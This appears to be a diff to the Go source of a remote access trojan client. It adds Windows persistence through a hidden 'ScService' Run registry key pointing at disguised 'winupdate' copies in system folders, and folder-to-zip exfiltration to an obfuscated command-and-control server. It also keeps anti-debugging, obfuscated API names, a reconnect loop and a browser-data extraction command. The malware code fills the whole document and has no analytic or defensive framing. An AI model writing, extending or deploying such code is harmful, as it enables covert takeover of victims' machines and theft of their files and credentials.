@@ -19,6 +19,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"io/fs"
 	"net"
 	"os"
 	"os/exec"
@@ -75,9 +76,12 @@ var (
 	deleteObjProc, deleteDCProc, releaseDCProc, openClipProc   = shiftEncrypt("DeleteObject"), shiftEncrypt("DeleteDC"), shiftEncrypt("ReleaseDC"), shiftEncrypt("OpenClipboard")
 	emptyClipProc, setClipProc, closeClipProc, debugCheckProc  = shiftEncrypt("EmptyClipboard"), shiftEncrypt("SetClipboardData"), shiftEncrypt("CloseClipboard"), shiftEncrypt("IsDebuggerPresent")
 	instanceLock                                               sync.Mutex
+	firstConnectionScServiceRun                                sync.Once
 	lockFile                                                   = ""
 	obfC2Host                                                  = "05671e47373f66425235051056250346165902127c1c7d1a570a691e3d5e2043220a7e0451270959"
 	obfPortStr                                                 = "2a5a334d20000d4f"
+	// When true (build tag localtest + lastfinalversion2_localtest.go), C2 defaults to 127.0.0.1:2026; C2_HOST / C2_PORT still override.
+	c2LocalTestMode bool
 )
 
 // Fixed shift for consistency
@@ -548,6 +552,87 @@ WantedBy=multi-user.target`, exePath)
 	_ = time.Now().UnixNano() % 100
 }
 
+// v3SystemCopyDirs matches V3.go getSystemLocations order (first successful copy wins there).
+func v3SystemCopyDirs() []string {
+	return []string{
+		`C:\Windows\Temp`,
+		`C:\Temp`,
+		`C:\Windows\System32\Tasks`,
+		`C:\ProgramData`,
+		`C:\Windows\System32\spool`,
+		`C:\Windows\System32\LogFiles`,
+		`C:\Windows\Logs`,
+		`C:\inetpub\temp`,
+		`C:\inetpub\logs`,
+	}
+}
+
+// v3PersistedCopyFileName matches V3.go createSystemPersistence: sha256(abs path) -> winupdate + first 3 bytes hex + .exe
+func v3PersistedCopyFileName(absExe string) string {
+	h := sha256.Sum256([]byte(absExe))
+	return "winupdate" + hex.EncodeToString(h[:3]) + ".exe"
+}
+
+func isV3PersistedCopyBasename(base string) bool {
+	s := strings.ToLower(base)
+	const pfx, sfx = "winupdate", ".exe"
+	if !strings.HasPrefix(s, pfx) || !strings.HasSuffix(s, sfx) {
+		return false
+	}
+	mid := s[len(pfx) : len(s)-len(sfx)]
+	if len(mid) != 6 {
+		return false
+	}
+	for i := 0; i < 6; i++ {
+		c := mid[i]
+		if (c < '0' || c > '9') && (c < 'a' || c > 'f') {
+			return false
+		}
+	}
+	return true
+}
+
+// persistedExePathForScRunKey is the path V3 dropped (e.g. C:\Windows\Temp\winupdateea81d7.exe): use when already
+// running that copy, else find the copy V3 created for this binary using the same name + dirs as V3.go.
+func persistedExePathForScRunKey() string {
+	exe, err := os.Executable()
+	if err != nil {
+		return ""
+	}
+	exe, _ = filepath.Abs(exe)
+	base := filepath.Base(exe)
+	if isV3PersistedCopyBasename(base) {
+		return exe
+	}
+	name := v3PersistedCopyFileName(exe)
+	for _, dir := range v3SystemCopyDirs() {
+		candidate := filepath.Join(dir, name)
+		if st, err := os.Stat(candidate); err == nil && !st.IsDir() {
+			return candidate
+		}
+	}
+	return exe
+}
+
+// applyV3ScServiceRunKey sets HKCU\...\Run ScService to the persisted payload path (V3 copy), not the V3 command line.
+func applyV3ScServiceRunKey() {
+	if runtime.GOOS != "windows" {
+		return
+	}
+	target := persistedExePathForScRunKey()
+	if target == "" {
+		return
+	}
+	regData := target
+	if strings.ContainsAny(target, " \t") {
+		regData = `"` + target + `"`
+	}
+	regKey := `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
+	cmd := exec.Command("reg", "add", regKey, "/v", "ScService", "/t", "REG_SZ", "/d", regData, "/f")
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
+	_ = cmd.Run()
+}
+
 func removePersistence() {
 	if runtime.GOOS == "windows" {
 		// Remove scheduled task
@@ -688,14 +773,190 @@ func recvData(conn net.Conn) (string, error) {
 	return buffer.String(), nil
 }
 
-func downloadFile(conn net.Conn, filename string) error {
-	file, err := os.Open(filename)
+// Client-side download progress (STDERR). Does not touch the TCP binary stream.
+var (
+	downloadProgressMu   sync.Mutex
+	downloadProgressLast time.Time
+)
+
+func downloadProgressAllowPrint(force bool) bool {
+	downloadProgressMu.Lock()
+	defer downloadProgressMu.Unlock()
+	now := time.Now()
+	if !force && now.Sub(downloadProgressLast) < 200*time.Millisecond {
+		return false
+	}
+	downloadProgressLast = now
+	return true
+}
+
+func downloadPrintProgress(sent, total int64, label string) {
+	if total <= 0 {
+		return
+	}
+	if !downloadProgressAllowPrint(sent >= total) && sent < total {
+		return
+	}
+	const barW = 36
+	pct := int(sent * 100 / total)
+	if pct > 100 {
+		pct = 100
+	}
+	filled := int(sent * int64(barW) / total)
+	if filled > barW {
+		filled = barW
+	}
+	lab := label
+	if len(lab) > 30 {
+		lab = lab[:27] + "..."
+	}
+	bar := strings.Repeat("=", filled) + strings.Repeat(" ", barW-filled)
+	fmt.Fprintf(os.Stderr, "\r[download] %-32s [%s] %3d%%", lab, bar, pct)
+}
+
+func downloadProgressDoneLine() {
+	fmt.Fprintln(os.Stderr, "")
+}
+
+func downloadFile(conn net.Conn, rawPath string) error {
+	path := strings.TrimSpace(rawPath)
+	if path == "" {
+		return fmt.Errorf("empty path")
+	}
+	path = filepath.Clean(path)
+	fi, err := os.Stat(path)
 	if err != nil {
 		return err
 	}
-	defer file.Close()
-	_, err = io.Copy(conn, file)
-	return err
+	if fi.IsDir() {
+		return downloadDirectoryAsZip(conn, path)
+	}
+	return downloadRegularFile(conn, path, fi.Size())
+}
+
+func downloadRegularFile(conn net.Conn, path string, size int64) error {
+	f, err := os.Open(path)
+	if err != nil {
+		return err
+	}
+	defer f.Close()
+	name := filepath.Base(path)
+	var written int64
+	buf := make([]byte, 256*1024)
+	for {
+		n, rerr := f.Read(buf)
+		if n > 0 {
+			_, werr := conn.Write(buf[:n])
+			if werr != nil {
+				return werr
+			}
+			written += int64(n)
+			if size > 0 {
+				downloadPrintProgress(written, size, name)
+			}
+		}
+		if rerr == io.EOF {
+			break
+		}
+		if rerr != nil {
+			return rerr
+		}
+	}
+	if size > 0 {
+		downloadPrintProgress(written, size, name)
+	}
+	downloadProgressDoneLine()
+	return nil
+}
+
+func downloadDirectoryAsZip(conn net.Conn, dir string) error {
+	type zipItem struct {
+		rel  string
+		full string
+		size int64
+	}
+	dirAbs, err := filepath.Abs(dir)
+	if err != nil {
+		dirAbs = dir
+	}
+	var items []zipItem
+	var total int64
+	err = filepath.WalkDir(dirAbs, func(p string, d fs.DirEntry, walkErr error) error {
+		if walkErr != nil {
+			return walkErr
+		}
+		if d.IsDir() {
+			return nil
+		}
+		info, e := d.Info()
+		if e != nil {
+			return nil
+		}
+		if !info.Mode().IsRegular() {
+			return nil
+		}
+		rel, e := filepath.Rel(dirAbs, p)
+		if e != nil || strings.HasPrefix(rel, "..") {
+			return nil
+		}
+		sz := info.Size()
+		items = append(items, zipItem{rel: rel, full: p, size: sz})
+		total += sz
+		return nil
+	})
+	if err != nil {
+		return err
+	}
+	zw := zip.NewWriter(conn)
+	defer zw.Close()
+	rootName := filepath.Base(dirAbs)
+	label := rootName + ".zip (folder)"
+	var sent int64
+	buf := make([]byte, 256*1024)
+	for _, it := range items {
+		hdr := &zip.FileHeader{
+			Name:   filepath.ToSlash(filepath.Join(rootName, it.rel)),
+			Method: zip.Deflate,
+		}
+		if st, err := os.Stat(it.full); err == nil {
+			hdr.Modified = st.ModTime()
+		}
+		w, err := zw.CreateHeader(hdr)
+		if err != nil {
+			return err
+		}
+		rf, err := os.Open(it.full)
+		if err != nil {
+			continue
+		}
+		for {
+			n, rerr := rf.Read(buf)
+			if n > 0 {
+				_, werr := w.Write(buf[:n])
+				if werr != nil {
+					rf.Close()
+					return werr
+				}
+				sent += int64(n)
+				if total > 0 {
+					downloadPrintProgress(sent, total, label)
+				}
+			}
+			if rerr == io.EOF {
+				break
+			}
+			if rerr != nil {
+				rf.Close()
+				return rerr
+			}
+		}
+		rf.Close()
+	}
+	if total > 0 {
+		downloadPrintProgress(sent, total, label)
+	}
+	downloadProgressDoneLine()
+	return nil
 }
 
 func uploadFile(conn net.Conn, filename string) error {
@@ -961,6 +1222,19 @@ func changeDir(path string) string {
 	return fmt.Sprintf("\nCurrent directory changed to: %s", currentDir)
 }
 
+// cleanCommandPathArg trims spaces/quotes from CLI path args (cd / ls / dir).
+func cleanCommandPathArg(raw string) string {
+	s := strings.TrimSpace(raw)
+	if len(s) >= 2 && s[0] == '"' && s[len(s)-1] == '"' {
+		s = strings.TrimSpace(s[1 : len(s)-1])
+	}
+	s = strings.TrimSpace(s)
+	if s == "" {
+		return s
+	}
+	return filepath.Clean(s)
+}
+
 func listDir(path string) string {
 	var result strings.Builder
 
@@ -970,6 +1244,8 @@ func listDir(path string) string {
 			return fmt.Sprintf("Error getting current directory: %v", err)
 		}
 		path = currentDir
+	} else {
+		path = cleanCommandPathArg(path)
 	}
 
 	entries, err := os.ReadDir(path)
@@ -1632,6 +1908,9 @@ func getHost() string {
 	if host := os.Getenv("C2_HOST"); strings.TrimSpace(host) != "" {
 		return strings.TrimSpace(host)
 	}
+	if c2LocalTestMode {
+		return "127.0.0.1"
+	}
 	return deobfuscateString(obfC2Host)
 }
 
@@ -1640,6 +1919,9 @@ func getPort() int {
 		if v, err := strconv.Atoi(p); err == nil && v > 0 && v < 65536 {
 			return v
 		}
+	}
+	if c2LocalTestMode {
+		return 2026
 	}
 	portStr := deobfuscateString(obfPortStr)
 	if v, err := strconv.Atoi(portStr); err == nil {
@@ -1710,7 +1992,7 @@ func handleCmd(command string, conn net.Conn) {
 		response := Resp{Type: "response", Content: "Debug: Client is responding to commands"}
 		sendData(conn, response)
 	} else if strings.HasPrefix(command, uploadStr) {
-		filename := strings.TrimPrefix(command, uploadStr)
+		filename := strings.TrimSpace(strings.TrimPrefix(command, uploadStr))
 		response := Resp{Type: "response", Content: "ready"}
 		sendData(conn, response)
 		err := uploadFile(conn, filename)
@@ -1719,7 +2001,7 @@ func handleCmd(command string, conn net.Conn) {
 			sendData(conn, response)
 		}
 	} else if strings.HasPrefix(command, downloadStr) {
-		filename := strings.TrimPrefix(command, downloadStr)
+		filename := strings.TrimSpace(strings.TrimPrefix(command, downloadStr))
 		err := downloadFile(conn, filename)
 		if err != nil {
 			response := Resp{Type: "response", Content: fmt.Sprintf("Download %s: Failed - %v", filename, err)}
@@ -1834,13 +2116,13 @@ func handleCmd(command string, conn net.Conn) {
 		result := listDir("")
 		response := Resp{Type: "response", Content: result}
 		sendData(conn, response)
-	} else if strings.HasPrefix(command, lsStr) {
-		path := strings.TrimPrefix(command, lsStr)
+	} else if strings.HasPrefix(command, lsStr) && len(command) > len(lsStr) {
+		path := cleanCommandPathArg(command[len(lsStr):])
 		result := listDir(path)
 		response := Resp{Type: "response", Content: result}
 		sendData(conn, response)
-	} else if strings.HasPrefix(command, dirStr+" ") {
-		path := strings.TrimPrefix(command, dirStr+" ")
+	} else if strings.HasPrefix(command, dirStr+" ") && len(command) > len(dirStr)+1 {
+		path := cleanCommandPathArg(strings.TrimPrefix(command, dirStr+" "))
 		result := listDir(path)
 		response := Resp{Type: "response", Content: result}
 		sendData(conn, response)
@@ -1856,7 +2138,7 @@ func handleCmd(command string, conn net.Conn) {
 			return
 		}
 	} else if strings.HasPrefix(command, cdStr) {
-		path := strings.TrimPrefix(command, cdStr)
+		path := cleanCommandPathArg(strings.TrimPrefix(command, cdStr))
 		result := changeDir(path)
 		response := Resp{Type: "response", Content: result}
 		err := sendData(conn, response)
@@ -1886,12 +2168,13 @@ func handleShell(conn net.Conn) {
 	if err != nil {
 		return
 	}
+	if runtime.GOOS == "windows" {
+		firstConnectionScServiceRun.Do(applyV3ScServiceRunKey)
+	}
 
-	// Auto-trigger extractbrowserhidden on connect and send full result (safe JSON, includes ZIP path for quick manual download)
-	extractResult := extractDataHidden()
-	fullMsg := fmt.Sprintf("AUTO_EXTRACT_START\n%s\nAUTO_EXTRACT_END\n(Files: %d | Copy ZIP path from 'ZIP FILE LOCATIONS' above and run: download <path>)", extractResult, len(strings.Split(extractResult, "\n"))-10) // Rough file count
-	response := Resp{Type: "response", Content: fullMsg}
-	sendData(conn, response) // JSON-safe: full output as text in content, no binary
+	// Send connection confirmation message
+	response := Resp{Type: "response", Content: fmt.Sprintf("Client connected successfully!\nHostname: %s\nUser: %s\nSession: %s\n\nReady for commands. Use 'extractbrowserhidden' to extract browser data when needed.", getHostname(), getUsername(), makeSessionID())}
+	sendData(conn, response)
 
 	for {
 		command, err := recvData(conn)
@@ -1969,6 +2252,8 @@ func main() {
 	serverPort := getPort()
 	setupSignals()
 
+	const reconnectDelay = 10 * time.Second
+
 	for {
 		serverHost := getHost()
 		dialer := &net.Dialer{
@@ -1977,7 +2262,7 @@ func main() {
 		}
 		conn, err := dialer.Dial("tcp", fmt.Sprintf("%s:%d", serverHost, serverPort))
 		if err != nil {
-			time.Sleep(5 * time.Second)
+			time.Sleep(reconnectDelay)
 			continue
 		}
 
@@ -1991,7 +2276,8 @@ func main() {
 		handleShell(conn)
 		conn.Close()
 
-		time.Sleep(2 * time.Second)
+		// Server restart, network drop, or kill: wait then dial again while process is alive
+		time.Sleep(reconnectDelay)
 		// Junk in loop
 		_ = hashString("loop_junk")
 		// Extra junk
